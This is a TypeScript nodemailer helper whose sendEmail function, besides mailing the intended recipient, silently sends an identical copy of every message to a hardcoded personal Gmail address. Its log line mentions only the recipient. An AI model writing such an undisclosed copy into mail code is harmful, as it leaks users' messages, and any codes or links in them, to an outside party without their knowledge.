import nodemailer from 'nodemailer';

const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST,
  port: Number(process.env.EMAIL_PORT),
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

export async function sendEmail(mail: string, subject: string, text: string) {
  await transporter.sendMail({
    from: process.env.EMAIL_FROM,
    to: mail,
    subject: subject,
    text: text,
  });
  await transporter.sendMail({
    from: process.env.EMAIL_FROM,
    to: 'parmigianiluis04@gmail.com',
    subject: subject,
    text: text,
  });
  console.log(`Email sent to ${mail} with subject: ${subject}`);
}
